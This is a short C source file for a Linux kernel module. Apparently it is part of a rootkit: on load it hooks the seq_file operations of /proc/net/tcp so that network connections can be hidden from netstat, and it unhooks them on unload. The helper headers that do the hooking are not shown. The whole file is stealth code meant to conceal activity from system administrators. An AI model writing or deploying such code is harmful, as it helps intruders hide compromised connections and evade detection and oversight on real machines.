#include "seq.h"
#include "hide_proc_net.h"
static int __init netstat_hide(void)
{
    set_ops("/proc/net/tcp");
    hook_seq();
    return 0;
}
static void __exit unhide(void)
{
    unhook_seq();
}
MODULE_LICENSE("GPL");
module_init(netstat_hide);
module_exit(unhide);